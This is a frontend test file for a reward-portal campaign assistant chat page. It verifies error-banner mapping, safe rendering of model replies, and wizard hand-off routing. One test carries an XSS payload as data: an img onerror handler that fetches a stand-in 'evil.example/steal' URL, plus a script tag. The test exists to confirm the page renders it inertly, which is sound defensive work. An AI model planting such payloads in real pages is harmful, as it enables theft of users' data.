/**
 * T-049 verification steps 3, 4 and 7, driven through the **real** `features/campaign-agent/api.ts`
 * and the real `lib/apiError.ts` — only the axios transport is stubbed.
 *
 * The other specs in this folder mock the `api` module, which is right for testing the screen's
 * behaviour but means the mapping *from a real server response to what the maker sees* is never
 * exercised. These three cases close that gap:
 *
 *  - **step 3** — the model service is down, so the server answers a genuine `503
 *    AGENT_LLM_UNAVAILABLE` envelope (the exact body T-048's verification step 6 observed). The
 *    banner and the working wizard link must come out of that, with no client-invented copy.
 *  - **step 4** — a reply body containing `<img onerror=…>`, exactly as an attacker-influenced
 *    model would emit it, arrives through the full parse chain and is rendered as literal text.
 *  - **step 7** — the hand-off path the server sends resolves, in the real route table, to the
 *    campaign screen; and that screen renders the **wizard** for an editable draft, which is what
 *    *"same campaign, fully editable"* means in this SPA (`CampaignDetailPage`'s own header).
 */
import { beforeEach, describe, expect, it, vi } from 'vitest';
import { render, screen } from '@testing-library/react';
import { MemoryRouter, RouterProvider, createMemoryRouter } from 'react-router-dom';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
import type { Bootstrap } from '@reward-portal/shared';

const { mockGet, mockPost } = vi.hoisted(() => ({ mockGet: vi.fn(), mockPost: vi.fn() }));

vi.mock('axios', async (importOriginal) => {
  const actual = await importOriginal<typeof import('axios')>();
  return {
    ...actual,
    default: {
      ...actual.default,
      create: () => ({
        get: mockGet,
        post: mockPost,
        patch: vi.fn(),
        put: vi.fn(),
        delete: vi.fn(),
        interceptors: { request: { use: vi.fn() }, response: { use: vi.fn() } },
      }),
    },
  };
});

import { AgentChatPage } from '../../../src/features/campaign-agent/AgentChatPage';
import { buildRouteObjects } from '../../../src/app/router';
import { campaign, created, session, turn } from './fixtures';

/** An axios-shaped rejection carrying the server's real error envelope (T-014's normaliser). */
function axiosError(status: number, code: string, message: string) {
  return {
    isAxiosError: true,
    response: { status, data: { error: { code, message, traceId: '01J8F3K9QP2M7N00000000' } } },
    message: `Request failed with status code ${String(status)}`,
  };
}

function renderChat() {
  const client = new QueryClient({ defaultOptions: { queries: { retry: false } } });
  return render(
    <QueryClientProvider client={client}>
      <MemoryRouter initialEntries={['/campaigns/assistant']}>
        <AgentChatPage />
      </MemoryRouter>
    </QueryClientProvider>,
  );
}

const makerBootstrap: Bootstrap = {
  user: { id: 2, displayName: 'Mo Maker', role: 'maker', locale: 'en', timezone: null },
  scope: { countryId: 1, tenantId: 1, merchantId: null },
  nav: [],
  permissions: { campaign: ['view', 'create', 'update', 'submit'] },
  widgets: [],
  messages: {},
};

beforeEach(() => {
  mockGet.mockReset();
  mockPost.mockReset();
});

describe('verification step 3 — the model service is stopped', () => {
  it('a real 503 envelope becomes §9’s banner and a working wizard link', async () => {
    mockGet.mockResolvedValue({ data: { data: [] } });
    mockPost.mockRejectedValue(
      axiosError(503, 'AGENT_LLM_UNAVAILABLE', 'The assistant is unavailable right now.'),
    );

    renderChat();

    expect(
      await screen.findByText(
        /The assistant is unavailable — you can still create this campaign in the wizard/,
      ),
    ).toBeInTheDocument();
    expect(
      screen.getByRole('link', { name: 'Create this campaign in the wizard' }),
    ).toHaveAttribute('href', '/campaigns/new');
    // Nothing internal leaks into the chat: no host, no port, no ECONNREFUSED.
    expect(document.body.textContent).not.toMatch(/ECONNREFUSED|11434|ollama/i);
  });
});

describe('verification step 4 — an assistant reply containing markup', () => {
  it('arrives through the real parse chain and is rendered as literal text', async () => {
    const payload =
      'Here you go: <img src=x onerror="fetch(\'https://evil.example/steal\')"> <script>alert(1)</script>';
    mockGet.mockResolvedValue({ data: { data: [session()] } });
    mockPost.mockResolvedValue({ data: { data: turn({ reply: payload }) } });
    mockGet.mockResolvedValueOnce({ data: { data: [] } });

    const { container } = renderChat();

    expect(await screen.findByText(payload)).toBeInTheDocument();
    expect(container.querySelector('img')).toBeNull();
    expect(container.querySelector('script')).toBeNull();
    expect(container.querySelector('[onerror]')).toBeNull();
  });
});

describe('verification step 7 — the draft opens in the wizard', () => {
  it('the hand-off path the server sent points at the created campaign', () => {
    expect(created().handOff.wizardPath).toBe(`/campaigns/${String(created().campaign.id)}`);
  });

  it('that path resolves, in the real route table, to the editable wizard for a draft', async () => {
    mockGet.mockImplementation((url: string) => {
      if (url === '/me/bootstrap') return Promise.resolve({ data: { data: makerBootstrap } });
      if (url === '/campaigns/42') {
        return Promise.resolve({ data: { data: campaign({ id: 42, editable: true }) } });
      }
      // Every other campaign sub-resource the wizard loads; empty is enough to render step 1.
      return Promise.resolve({ data: { data: [] } });
    });

    const client = new QueryClient({ defaultOptions: { queries: { retry: false } } });
    const router = createMemoryRouter(buildRouteObjects(), {
      initialEntries: [created().handOff.wizardPath],
      future: { v7_relativeSplatPath: true },
    });
    render(
      <QueryClientProvider client={client}>
        <RouterProvider router={router} />
      </QueryClientProvider>,
    );

    // `CampaignDetailPage` renders `CampaignWizardPage` for an editable campaign — the campaign the
    // assistant created is therefore the same campaign, in the same editor, as a hand-built one.
    expect(
      await screen.findByRole('heading', { name: /Weekend Electronics Cashback/ }),
    ).toBeInTheDocument();
    expect(await screen.findByText(/Step 1 of 7|Basics/)).toBeInTheDocument();
  });
});
